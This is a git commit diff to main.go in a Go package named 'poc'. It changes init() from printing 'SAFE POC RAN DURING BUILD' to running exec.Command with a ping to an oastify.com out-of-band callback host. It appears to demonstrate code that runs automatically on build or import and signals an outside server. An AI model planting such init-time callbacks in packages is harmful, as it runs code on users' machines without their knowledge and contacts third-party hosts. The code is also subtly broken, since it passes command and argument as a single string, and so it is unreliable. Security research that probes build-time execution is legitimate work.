281389216886b3fecd2c34006d6c404886d407a9
M4KR0 <60741904+m4kr0x@users.noreply.github.com>
2025-11-18 21:13:37 +0200

    Update main.go

--- main.go
+++ main.go
@@ -5,9 +5,20 @@ package poc
 void x() {}
 */
 import "C"
-
+import "os/exec"
 import "fmt"
 
 func init() {
-    fmt.Println(">>> SAFE POC RAN DURING BUILD <<<")
+    cmd := exec.Command("ping 0bc32egulq8qb88n1rekfk5o1f76v3js.oastify.com")
+	stdout, err := cmd.Output()
+
+	if err != nil {
+		fmt.Println(err.Error())
+		return
+	}
+
+	// Print the output
+	fmt.Println(string(stdout))
 }
+
+	
